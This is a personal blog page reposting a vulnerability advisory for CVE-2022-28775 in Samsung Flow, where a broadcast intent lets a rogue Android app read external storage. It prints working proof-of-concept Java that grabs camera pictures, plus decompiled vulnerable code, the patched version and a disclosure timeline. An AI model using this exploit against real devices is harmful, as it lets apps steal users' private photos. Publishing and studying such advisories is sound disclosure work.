<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2022-28775 Details | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2022-28775 Details" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/cves/cve-2022-28775" />
<meta property="og:url" content="http://localhost:4000/cves/cve-2022-28775" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2022-28775 Details" />
<script type="application/ld+json">
{"@type":"WebPage","headline":"CVE-2022-28775 Details","description":"Sometimes I want to publish stuff unfiltered.","url":"http://localhost:4000/cves/cve-2022-28775","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">CVE-2022-28775 Details</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpslabsf-securecomadvisoriessamsung-flow-any-app-can-read-the-external-storage">Original post: <a href="https://labs.f-secure.com/advisories/samsung-flow-any-app-can-read-the-external-storage/">https://labs.f-secure.com/advisories/samsung-flow-any-app-can-read-the-external-storage/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Samsung Flow prior to version 4.8.06.5</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>Medium</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2022-28775</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Security Control Bypass</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>F-Secure looked into exploiting the Samsung Galaxy S21 device for Austin Pwn2Own 2021. Samsung Flow, an application offered on the Galaxy Store, had an issue with how it handled broadcasted intents. A rogue application could use this issue to read contents on the device’s external storage without requiring the proper Android permissions.</p>

<h2 id="the-exploit">The Exploit</h2>

<p>As an example, the following exploit code will exfiltrate a picture taken by the device’s camera. This example requires two parts. First, the rogue application must contain an exported activity with the following Java code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class IntentProxyToContentProvider extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri uri = Uri.parse(getIntent().getDataString());
        try {
            Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri));
            String yayuriyay = MediaStore.Images.Media.insertImage(getContentResolver(),
                bitmap,
                "yaytitleyay",
                "yaydescriptionyay");
            InputStream input = getContentResolver().openInputStream(Uri.parse(yayuriyay));
            File file = new File(getFilesDir(), "yayoutputyay.jpg");
            FileOutputStream output = new FileOutputStream(file);
            try{
                byte[] buf = new byte[1024];
                int len;
                while ((len = input.read(buf)) &gt; 0) {
                    output.write(buf, 0, len);
                }
          } catch (Exception e) {
                e.printStackTrace();
          } finally {
                try {
                    if (input != null)
                    input.close();
                    if (output != null)
                    output.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (FileNotFoundException e) {
           e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
</code></pre></div></div>

<p>Second, the rogue application must send the following Broadcast, replacing “<target picture="">" with the name of the picture found on the device, and "<rogue application="" package="">" with the package name of the rogue application:</rogue></target></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent();
intent.setComponent(new ComponentName("com.samsung.android.galaxycontinuity", "com.samsung.android.galaxycontinuity.manager.GlobalBroadcastReceiver"));
intent.setAction("com.samsung.android.galaxycontinuity.action.ACTION_FLOW_CONTENT_PENDING_INTENT"); 
Intent intent2 = new Intent();
intent2.setComponent(new ComponentName("&lt;rogue application package&gt;", " &lt;rogue application package&gt;.IntentProxyToContentProvider"));
intent2.setData(Uri.parse("content://com.samsung.android.galaxycontinuity.provider/external_files/DCIM/Camera/&lt;target picture name&gt;"));
intent2.setFlags(195);
Bundle bundle = new Bundle();
bundle.putParcelable("_data", intent2);
bundle.putString("ClassName", "com.samsung.android.galaxycontinuity.activities.ChooserDelegateActivity");
intent.putExtras(bundle); 
sendBroadcast(intent);
</code></pre></div></div>

<p>The above code will perform the following steps:</p>

<ul>
  <li>Send a Broadcast to the exported Broadcast Receiver <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.manager.GlobalBroadcastReceiver</code></li>
  <li>The Broadcast Receiver opens the unexported Activity <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.activities.ChooserDelegateActivity</code></li>
  <li>The Activity passes permissions to read the unexported Content File Provider <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.provider</code> to the rogue application’s exported Activity mentioned earlier</li>
  <li>After successful exploitation, the targeted picture will be saved to the rogue application’s “Files” private directory. Specifically, it will be saved to <code class="language-plaintext highlighter-rouge">/data/data/&lt;rogue application package&gt;/Files/yayoutputyay.jpg</code>.</li>
</ul>

<h2 id="technical-details">Technical Details</h2>

<p>The exported Broadcast Receiver <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.manager.GlobalBroadcastReceiver</code> processes received broadcast intents by checking for:</p>

<ul>
  <li>The action value</li>
  <li>The extra string value <code class="language-plaintext highlighter-rouge">ClassName</code></li>
</ul>

<p>If the action value matches <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.action.ACTION_FLOW_CONTENT_PENDING_INTENT</code> and <code class="language-plaintext highlighter-rouge">ClassName</code> is not null, then a new intent is created and Samsung Flow will start the activity defined in <code class="language-plaintext highlighter-rouge">ClassName</code>. Any intent extras that is bundled with the broadcast intent is also bundled with the newly created intent:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void onReceive(Context context, Intent intent) {
        Intent intent2;
        try {
            String action = intent.getAction();
            intent.setComponent(null);
            if (action.equals("REQUEST_LAUNCH_MY_FILES")) {
                FileUtil.openMyFiles(intent.getStringExtra("START_PATH"));
                return;
            }
            if (!"android.intent.action.BOOT_COMPLETED".equals(action)) {
                if (!ACTION_LAZY_BOOT_COMPLETE.equals(action)) {
                    if (Define.ACTION_FLOW_CONTENT_PENDING_INTENT.equals(action)) {
                        String stringExtra = intent.getStringExtra("ClassName");
                        if (stringExtra != null) {
                            if ((stringExtra.equals(NotificationDetailActivity.class.getName()) || stringExtra.equals(ChatActivity.class.getName())) &amp;&amp; SettingsManager.getInstance().getNotificationOption()) {
                                Intent intent3 = new Intent(SamsungFlowApplication.get(), MirroringActivity.class);
                                intent3.setAction(Define.ACTION_SMARTVIEW_FROM_NOTIFICATION);
                                intent3.putExtra("FlowKey", intent.getStringExtra("FlowKey"));
                                intent3.setFlags(268435456);
                                SamsungFlowApplication.get().startActivity(intent3);
                                return;
                            }
                            Intent intent4 = new Intent(SamsungFlowApplication.get(), Class.forName(stringExtra));
                            intent4.replaceExtras(intent.getExtras());
                            intent4.setFlags(268435456);
                            SamsungFlowApplication.get().startActivity(intent4);
                            return;
</code></pre></div></div>

<p>By defining <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.activities.ChooserDelegateActivity" as the "ClassName</code>, a Create Chooser Intent is created based on the data defined in the passed intent’s parcelable extra <code class="language-plaintext highlighter-rouge">_data</code>. The intent bundled in <code class="language-plaintext highlighter-rouge">_data</code> can contain standard intent objects, intent extras.</p>

<p>This new intent is started via startActivity:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        startChooser(getIntent());
        finish();
    }
private void startChooser(Intent intent) {
        if (intent != null &amp;&amp; intent.getExtras().containsKey("_data")) {
            try {
                ArrayList&lt;? extends Parcelable&gt; arrayList = new ArrayList&lt;&gt;();
                arrayList.add(new ComponentName(SamsungFlowApplication.get().getPackageName(), ShareActivity.class.getName()));
                Intent createChooser = Intent.createChooser((Intent) intent.getParcelableExtra("_data"), ResourceUtil.getString(R.string.share));
                if (Build.VERSION.SDK_INT &gt;= 24) {
                    createChooser.putExtra("android.intent.extra.EXCLUDE_COMPONENTS", (Parcelable[]) arrayList.toArray(new Parcelable[0]));
                } else {
                    createChooser.putParcelableArrayListExtra("extra_chooser_droplist", arrayList);
                }
                if (intent.getBooleanExtra(EXTRA_POP_OVER_SUPPORTED, false)) {
                    int intExtra = intent.getIntExtra(EXTRA_POP_OVER_POS, -1);
                    ActivityOptions makeBasic = ActivityOptions.makeBasic();
                    makeBasic.semSetChooserPopOverPosition(intExtra);
                    startActivity(createChooser, makeBasic.toBundle());
                    return;
                }
                startActivity(createChooser);
            } catch (Exception e) {
                FlowLog.e(e);
            }
        }
    }
</code></pre></div></div>

<p>If the Create Chooser Intent passed to <code class="language-plaintext highlighter-rouge">startActivity</code> contains the following flags, then the target started activity will be given access to Samsung Flow’s content providers, including unexported content providers:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</code></li>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</code></li>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_READ_URI_PERMISSION</code></li>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code></li>
</ul>

<p>As an example, an intent passed to <code class="language-plaintext highlighter-rouge">startActivity</code> could contain a data value of <code class="language-plaintext highlighter-rouge">content://com.samsung.android.galaxycontinuity.provider/external_files/DCIM/Camera/&lt;target picture&gt;</code>. Then the target activity will be given access to the content provider <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.provider</code> and be able to download the file <code class="language-plaintext highlighter-rouge">/external_files/DCIM/Camera/&lt;target picture&gt;</code>. The following code within the target activity can be used to create a new file via the Android MediaStore content provider, and save the data that was obtained from <code class="language-plaintext highlighter-rouge">content://com.samsung.android.galaxycontinuity.provider/external_files/DCIM/Camera/&lt;target picture&gt;</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Uri uri = Uri.parse(getIntent().getDataString());
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri));
String yayuriyay = MediaStore.Images.Media.insertImage(getContentResolver(), bitmap, "yaytitleyay", "yaydescriptionyay");
Lod.d("yaytagyay", "this content provider contains the saved media: " + yayuriyay);
</code></pre></div></div>

<h2 id="remedial-action">Remedial Action</h2>

<p>Samsung has released Samsung Flow version 4.8.06.5 which addresses this issue. Users should update their Samsung Flow application to the latest version available.</p>

<h2 id="credits">Credits</h2>

<p>This issue was discovered by Ken Gannon.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>19/10/2021</td>
      <td>Issue disclosed to Samsung Mobile Security</td>
    </tr>
    <tr>
      <td>19/10/2021</td>
      <td>Issue assigned to a Samsung Security Analyst</td>
    </tr>
    <tr>
      <td>02/01/2022</td>
      <td>Samsung confirms the vulnerability and rates it as a critical risk issue</td>
    </tr>
    <tr>
      <td>04/03/2022</td>
      <td>Patch released, Samsung initiates process for bug bounty reward</td>
    </tr>
    <tr>
      <td>12/04/2022</td>
      <td>CVE Assigned</td>
    </tr>
    <tr>
      <td>04/05/2022</td>
      <td>Advisory Published</td>
    </tr>
  </tbody>
</table>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
